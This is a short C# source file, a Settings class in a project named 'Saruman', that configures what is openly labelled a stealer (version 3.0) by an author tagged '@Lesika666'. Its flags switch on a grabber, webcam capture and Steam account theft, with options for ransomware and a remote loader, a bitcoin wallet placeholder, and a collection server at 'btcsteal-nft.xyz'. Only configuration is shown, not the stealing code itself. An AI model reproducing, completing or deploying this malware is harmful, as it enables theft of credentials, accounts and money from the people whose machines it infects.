﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Saruman
{
   public  class Settings
    {
 	public static bool ransomware = false;
        public static string name = "Lesika666";
        public static string coded = "@Lesika666";
        public static bool grabber = true;
	public static string bitcoin_keshel = "KESHEL";
        public static bool webka = true;
        public static bool loader = false;
        public static bool steam = true;
        public static string url_loader = "LDRLNK";
        public static string Stealer_version = " 3.0";
        public static string Url = "http://btcsteal-nft.xyz/";
    }
}
